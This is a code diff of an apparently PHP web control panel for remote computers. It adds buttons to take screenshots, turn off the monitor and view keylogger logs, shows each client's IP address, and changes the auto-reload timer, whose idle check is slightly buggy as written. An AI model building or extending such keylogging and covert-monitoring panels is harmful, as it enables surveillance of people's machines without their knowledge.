@@ -13,6 +13,15 @@
 
      
       <style>
+        .actions {
+          display:inline-block; border:1px solid yellow; background: green; cursor:pointer;
+          padding: 5px;
+        }
+        .actions:hover {
+          background: orange;
+          color: black;
+        }
+
       #proc td {
         width: 20px;
       }
@@ -42,7 +51,14 @@
 
       </style>
       
-     <script> setTimeout(function() { window.location.reload(true); }, 5000); </script>
+     <script> 
+     var lastUserAction = 0;
+
+     setInterval(function() {
+       console.log("Checking last action time... " + new Date() - lastUserAction);
+      if(new Date() - lastUserAction > 5000)
+        window.location.reload(true);
+      }, 5000); </script>
 
   </head>
   <body>
@@ -244,13 +260,26 @@
 
                         <br/><br/><br/>
                         <div class="block">
-                          <span class="blockhead"><img src="img/net.png"/>  Send Alert/Message</span>
+                          <span class="blockhead"><img src="img/alert.png"/>  Send Alert/Message</span>
                           <span class="blockbody" style="width:100%">
                             <input style="color:black;width:100%" id="messagesender" placeholder="Enter a message to send to the remote computer..." ></input>
                           </span>
 
                           
                         </div>
+
+                         <br/><br/><br/>
+                        <div class="block">
+                          <span class="blockhead"><img src="img/act.png"/>  Remote Actions</span>
+                          <span class="blockbody" style="width:100%">
+                            <div class='actions' id="takescreenshotbutton">Take a screenshot</div>
+                            <div class='actions' id="monitoroffbutton">Turn off monitor</div>
+                            <div class='actions' id="keyloggerviewbutton">View Keylogger logs</div>
+                          </span>
+
+                          
+                        </div>
+
 
                         <br/><br/><br/>
                         <div class="block">
@@ -309,12 +338,12 @@
     $dump = file_get_contents("server/client.dump");
     $obj = json_decode($dump, true);
     $pcname =  array_values($obj)[$pccount]["id"];
-
+    $ipaddr =  array_values($obj)[$pccount]["ip"];
     ?>
 
     var pcid = <?php echo $pccount; ?>;
     var pcname = "<?php echo $pcname; ?>";
-    
+    var pcip = "<?php echo $ipaddr; ?>";
     </script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 
